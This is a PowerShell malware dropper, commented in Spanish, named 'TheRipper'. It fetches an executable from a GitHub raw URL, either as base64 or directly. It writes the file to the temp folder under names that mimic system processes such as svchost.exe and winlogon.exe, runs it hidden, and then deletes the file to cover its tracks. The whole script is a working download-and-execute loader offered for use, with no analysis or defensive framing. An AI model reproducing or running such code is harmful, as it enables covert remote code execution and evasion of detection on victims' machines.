# TheRipper-Fileless-FINAL.ps1 - Solución definitiva para ejecutables nativos
# Técnicas comprobadas para PE32+ nativos

function Invoke-NativeExecution {
    param(
        [string]$Base64Url = "https://raw.githubusercontent.com/garbanson111/Operacion_PR/main/TheRipper_base64.txt"
    )
    
    Write-Host "[=== THE RIPPER - FILELESS EXECUTION ===]" -ForegroundColor Cyan
    Write-Host "[+] Iniciando ejecución para PE32+ nativo..." -ForegroundColor Yellow
    
    try {
        # Método 1: Descarga directa y ejecución temporal
        Write-Host "[+] Método 1: Descargando y ejecutando..." -ForegroundColor Green
        
        # Usar WebClient para descargar
        $webClient = New-Object System.Net.WebClient
        $base64Content = $webClient.DownloadString($Base64Url)
        $webClient.Dispose()
        
        Write-Host "[+] Base64 obtenido ($($base64Content.Length) caracteres)" -ForegroundColor Green
        
        # Limpiar posibles saltos de línea
        $base64Content = $base64Content -replace "`n|`r|\s", ""
        
        # Convertir a bytes
        $exeBytes = [System.Convert]::FromBase64String($base64Content)
        Write-Host "[+] EXE decodificado ($($exeBytes.Length) bytes)" -ForegroundColor Green
        
        # Crear archivo temporal con nombre aleatorio
        $tempDir = $env:TEMP
        $randomName = "winlogon_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
        $tempExePath = Join-Path $tempDir $randomName
        
        Write-Host "[+] Creando archivo temporal: $tempExePath" -ForegroundColor Yellow
        
        # Escribir bytes al archivo
        [System.IO.File]::WriteAllBytes($tempExePath, $exeBytes)
        
        # Verificar que se creó correctamente
        if (Test-Path $tempExePath) {
            Write-Host "[+] Archivo temporal creado exitosamente" -ForegroundColor Green
            
            # Ejecutar el proceso
            Write-Host "[+] Ejecutando TheRipper..." -ForegroundColor Yellow
            
            $process = Start-Process -FilePath $tempExePath -WindowStyle Hidden -PassThru -ErrorAction Stop
            
            if ($process) {
                Write-Host "[✅] TheRipper ejecutado exitosamente (PID: $($process.Id))" -ForegroundColor Green
                
                # Programar eliminación después de 3 segundos
                Start-Sleep -Seconds 3
                
                # Intentar eliminar el archivo
                try {
                    if (Test-Path $tempExePath) {
                        Remove-Item $tempExePath -Force -ErrorAction SilentlyContinue
                        Write-Host "[+] Archivo temporal eliminado" -ForegroundColor Green
                    }
                } catch {
                    Write-Host "[!] No se pudo eliminar archivo temporal (puede estar en uso)" -ForegroundColor Yellow
                }
                
                return $true
            }
        }
        
        return $false
    }
    catch {
        Write-Host "[-] Error en Método 1: $($_.Exception.Message)" -ForegroundColor Red
        return Invoke-AlternativeMethod -Base64Content $base64Content
    }
}

function Invoke-AlternativeMethod {
    param([string]$Base64Content)
    
    Write-Host "[+] Método 2: Ejecución alternativa..." -ForegroundColor Yellow
    
    try {
        # Método más simple y directo
        $tempFile = "$env:TEMP\svchost.exe"
        
        # Convertir y escribir
        $bytes = [System.Convert]::FromBase64String($Base64Content)
        [System.IO.File]::WriteAllBytes($tempFile, $bytes)
        
        # Ejecutar inmediatamente
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $tempFile
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        if ($process) {
            Write-Host "[✅] TheRipper ejecutado (PID: $($process.Id))" -ForegroundColor Green
            
            # Eliminación en segundo plano
            Start-Job -ScriptBlock {
                param($file)
                Start-Sleep -Seconds 5
                try { if (Test-Path $file) { Remove-Item $file -Force } } catch { }
            } -ArgumentList $tempFile | Out-Null
            
            return $true
        }
    }
    catch {
        Write-Host "[-] Error en Método 2: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $false
}

function Invoke-DirectExecution {
    Write-Host "[+] Método 3: Ejecución directa desde URL..." -ForegroundColor Yellow
    
    try {
        # Método de respaldo: descargar el EXE directamente
        $directUrl = "https://raw.githubusercontent.com/garbanson111/Operacion_PR/main/TheRipper.exe"
        $tempPath = "$env:TEMP\winlogon.exe"
        
        # Descargar directamente
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($directUrl, $tempPath)
        $webClient.Dispose()
        
        if (Test-Path $tempPath) {
            # Ejecutar
            $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
            
            if ($process) {
                Write-Host "[✅] TheRipper ejecutado directamente (PID: $($process.Id))" -ForegroundColor Green
                
                # Limpiar después
                Start-Sleep -Seconds 2
                try { Remove-Item $tempPath -Force -ErrorAction SilentlyContinue } catch { }
                
                return $true
            }
        }
    }
    catch {
        Write-Host "[-] Error en Método 3: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $false
}

# VERIFICACIÓN DEL ENTORNO
Write-Host "[+] Verificando entorno..." -ForegroundColor Yellow
Write-Host "[+] PowerShell Version: $($PSVersionTable.PSVersion)" -ForegroundColor Gray
Write-Host "[+] Usuario: $env:USERNAME" -ForegroundColor Gray
Write-Host "[+] Temp Directory: $env:TEMP" -ForegroundColor Gray

# EJECUCIÓN PRINCIPAL
$success = $false

# Intentar métodos en orden
if (-not $success) { $success = Invoke-NativeExecution }
if (-not $success) { $success = Invoke-DirectExecution }

# RESULTADO FINAL
Write-Host "`n[=== RESULTADO FINAL ===]" -ForegroundColor Cyan
if ($success) {
    Write-Host "[🎉] ¡OPERACIÓN EXITOSA!" -ForegroundColor Green
    Write-Host "[✅] TheRipper se ha ejecutado correctamente" -ForegroundColor Green
    Write-Host "[🔧] Técnicas: Fileless + Living off the Land" -ForegroundColor White
} else {
    Write-Host "[❌] OPERACIÓN FALLIDA" -ForegroundColor Red
    Write-Host "[⚠️] Todos los métodos han fallado" -ForegroundColor Red
    Write-Host "[💡] Solución: Verifica la URL y el formato Base64" -ForegroundColor Yellow
}

# LIMPIEZA FINAL
Write-Host "`n[+] Realizando limpieza final..." -ForegroundColor Yellow
Remove-Variable webClient, base64Content, exeBytes, tempExePath -ErrorAction SilentlyContinue
[System.GC]::Collect()

Write-Host "[+] Proceso completado" -ForegroundColor Cyan
